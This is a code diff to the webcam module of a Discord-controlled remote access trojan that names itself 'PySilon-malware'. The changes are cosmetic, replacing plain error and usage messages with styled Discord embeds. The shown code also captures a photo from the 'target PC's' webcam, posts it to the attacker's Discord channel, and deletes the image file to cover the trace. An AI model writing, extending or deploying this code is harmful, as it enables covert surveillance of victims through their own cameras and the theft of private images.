@@ -10,7 +10,7 @@ async def webcam(ctx, action=None, camera_index=None):
         pygame.camera.init()
         cameras = pygame.camera.list_cameras()
         if not cameras:
-            return await ctx.send('No cameras found.')
+            return await ctx.send('```❗ No cameras found.```')
         if camera_index != None:
             camera_index = int(camera_index)
         else: camera_index = 0
@@ -26,5 +26,6 @@ async def webcam(ctx, action=None, camera_index=None):
         await ctx.send(embed=discord.Embed(title=current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'),file=discord.File('webcam.png'))
         subprocess.run('del /s webcam.png', shell=True)
     else:
-        await ctx.send('```Syntax: .webcam <action> <camera_index (default: 0)>\nActions:\n    photo - take a photo with target PC\'s webcam```')
-
+        embed = discord.Embed(title="📛 Error",description='```Syntax: .webcam <action> <camera_index (default: 0)>\nActions:\n    photo - take a photo with target PC\'s webcam```', colour=discord.Colour.red())
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+        await ctx.send(embed=embed)
